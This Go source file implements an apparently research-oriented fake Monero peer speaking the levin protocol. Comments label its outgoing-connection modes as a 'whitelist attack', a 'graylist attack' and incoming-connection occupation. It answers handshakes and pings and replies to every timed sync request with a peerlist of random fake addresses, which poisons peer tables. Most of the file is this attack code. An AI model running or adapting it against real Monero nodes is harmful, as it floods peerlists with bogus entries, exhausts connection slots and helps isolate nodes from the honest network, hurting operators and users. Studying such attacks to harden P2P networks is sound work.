package node

import (
	"crypto/rand"
	"fmt"
	"gomonero/levin"
	"log"
	"math/big"
	"net"
	"os"
	"strconv"
	"sync"
)

// 虚拟的门罗币节点
type Node struct {
	my_port        uint32
	network_id     []byte
	peer_id        uint64
	listener       net.Listener
	in_peers       map[net.Conn]bool
	in_peers_lock  sync.Mutex
	out_peers      map[net.Conn]bool
	out_peers_lock sync.Mutex
}

func CreateNode(network_type string, listen_port uint32) *Node {
	// 生成peer_id
	max := new(big.Int).Lsh(big.NewInt(1), 64)
	random_num, err := rand.Int(rand.Reader, max)
	if err != nil {
		fmt.Println("Error generating random peer_id: ", err)
		return nil
	}
	// 确定network_id
	var network_id []byte
	switch network_type {
	case "mainnet":
		network_id = levin.NetworkIdMainnet
	case "testnet":
		network_id = levin.NetworkIdTestnet
	default:
		network_id = levin.NetworkIdMainnet
	}
	node := Node{
		my_port:    listen_port,
		network_id: network_id,
		peer_id:    random_num.Uint64(),
		in_peers:   make(map[net.Conn]bool),
		out_peers:  make(map[net.Conn]bool),
	}
	return &node
}

func (node *Node) Start() {
	// IO多路复用启动Server
	// 在Linux环境下，goroutine底层会调用epoll来实现高并发

	// 1. 创建监听器
	var err error
	node.listener, err = net.Listen("tcp", ":"+strconv.Itoa(int(node.my_port)))
	if err != nil {
		log.Println("Error create listener: ", err)
		os.Exit(1)
	}
	fmt.Println("Node Server is listening on port " + strconv.Itoa(int(node.my_port)))

	// 2. 使用协程处理传入连接请求
	go node.acceptIncomingConnection()
}

func (node *Node) Stop() {
	node.listener.Close()
}

func (node *Node) acceptIncomingConnection() {
	for {
		conn, err := node.listener.Accept()
		fmt.Println("Accept")
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			os.Exit(0)
		}

		// 3. 并发处理连接
		go node.handleIncomingConnection(conn)
	}
}

func (node *Node) handleIncomingConnection(conn net.Conn) {
	defer node.dropIncommingConnection(conn)
	// fmt.Println("Accept incoming connection from " + (*conn).RemoteAddr().String())

	for {
		// 读消息
		msg := levin.LevinProtocolMessage{}
		err := msg.ReadBuffer(conn)
		if err != nil {
			return
		}

		// 处理消息
		if msg.GetCommand() == levin.CommandHandshake {
			if msg.GetExpectResponse() {
				response_msg := levin.LevinProtocolMessage{}
				response_msg.CreateHandshakeResponse(node.my_port, node.network_id, node.peer_id, nil)
				data_to_send := append(response_msg.HeaderBytes(), response_msg.PayloadBytes()...)
				_, err := conn.Write(data_to_send)
				if err != nil {
					log.Println("Error sending data:", err)
					return
				} else {
					fmt.Println("Handshake response sent!")
					// 成功接受传入连接，将传入连接记录下来
					node.recordIncomingConnection(conn)
				}
			} else {
				fmt.Println("Receive Handshake response!")
			}
			continue
		}
		if msg.GetCommand() == levin.CommandPingPong {
			if msg.GetExpectResponse() {
				response_msg := levin.LevinProtocolMessage{}
				response_msg.CreatePongResponse(node.peer_id)
				data_to_send := append(response_msg.HeaderBytes(), response_msg.PayloadBytes()...)
				_, err := conn.Write(data_to_send)
				if err != nil {
					log.Println("Error sending data:", err)
					return
				} else {
					fmt.Println("Pong response sent!")
				}
			} else {
				fmt.Println("Receive Pong response")
			}
			continue
		}
		if msg.GetCommand() == levin.CommandTimedSync {
			if msg.GetExpectResponse() {
				response_msg := levin.LevinProtocolMessage{}
				response_msg.CreateTimedSyncResponse(node.my_port, node.network_id, node.peer_id, generateRamdomPeerlist(levin.MaxPeerlistEntryNum))
				data_to_send := append(response_msg.HeaderBytes(), response_msg.PayloadBytes()...)
				_, err := conn.Write(data_to_send)
				if err != nil {
					log.Println("Error sending data:", err)
					return
				} else {
					fmt.Println("Timed Sync response sent!")
				}
			} else {
				fmt.Println("Receive Timed Sync response")
			}
			continue
		}
	}
}

// disconnect表示是否在连接建立完成后立刻断开连接
func (node *Node) EstablishOutgoingConnection(ip string, port uint16, disconnect_immediately bool) error {
	// 建立tcp连接
	address := ip + ":" + strconv.Itoa(int(port))
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Fail to connect to target %s: %v\n", address, err)
		return err
	}
	// fmt.Printf("Successfully connect to target %s\n", address)
	// 发送握手请求
	request_msg := levin.LevinProtocolMessage{}
	request_msg.CreateHandshakeRequest(node.my_port, node.network_id, node.peer_id)
	data_to_send := append(request_msg.HeaderBytes(), request_msg.PayloadBytes()...)
	_, err = conn.Write(data_to_send)
	if err != nil {
		log.Println("Error sending data:", err)
		return err
	} else {
		fmt.Println("Handshake request sent!")
	}
	// 此时monero传出连接已经建立，将连接加入到node的记录中
	node.recordOutgoingConnection(conn)
	// 循环接收对端的响应
	go func() {
		defer node.dropOutgoingConnection(conn)
		for {
			// 读消息
			msg := levin.LevinProtocolMessage{}
			err := msg.ReadBuffer(conn)
			if err != nil {
				return
			}

			// 处理Handshake响应消息
			if msg.GetCommand() == levin.CommandHandshake && !msg.GetExpectResponse() {
				// 是否立刻断开连接
				if disconnect_immediately {
					break // 立刻断开连接：whitelist attack
				}
				// 否则，不断开连接：graylist attack和传入连接占领
			}
			if msg.GetCommand() == levin.CommandTimedSync {
				// timed sync 请求
				if msg.GetExpectResponse() {
					response_msg := levin.LevinProtocolMessage{}
					response_msg.CreateTimedSyncResponse(node.my_port, node.network_id, node.peer_id, generateRamdomPeerlist(levin.MaxPeerlistEntryNum))
				}
			}
		}
	}()
	return nil
}

// 传入连接建立后的处理
func (node *Node) recordIncomingConnection(conn net.Conn) {
	node.in_peers_lock.Lock()
	node.in_peers[conn] = true
	node.in_peers_lock.Unlock()
}

// 传出连接建立后的处理
func (node *Node) recordOutgoingConnection(conn net.Conn) {
	node.out_peers_lock.Lock()
	node.out_peers[conn] = true
	node.out_peers_lock.Unlock()
}

// 传入连接断开的后处理
func (node *Node) dropIncommingConnection(conn net.Conn) {
	node.in_peers_lock.Lock()
	delete(node.in_peers, conn)
	defer conn.Close()
	node.in_peers_lock.Unlock()
}

// 传出连接断开的后处理
func (node *Node) dropOutgoingConnection(conn net.Conn) {
	node.out_peers_lock.Lock()
	delete(node.out_peers, conn)
	defer conn.Close()
	node.out_peers_lock.Unlock()
}

/*
=============

	Tools

=============
*/
func generateRamdomPeerlist(num_of_peer int) []levin.PeerlistEntry {
	if num_of_peer > levin.MaxPeerlistEntryNum {
		num_of_peer = levin.MaxPeerlistEntryNum
	}
	peerlist := make([]levin.PeerlistEntry, num_of_peer)
	max := new(big.Int).Lsh(big.NewInt(1), 64)
	for i := 0; i < num_of_peer; i++ {
		random_num, _ := rand.Int(rand.Reader, max)
		peerlist[i].IP = uint32(random_num.Uint64())
		random_num, _ = rand.Int(rand.Reader, max)
		peerlist[i].Port = uint16(random_num.Uint64())
		random_num, _ = rand.Int(rand.Reader, max)
		peerlist[i].PeerId = random_num.Uint64()
	}
	return peerlist
}
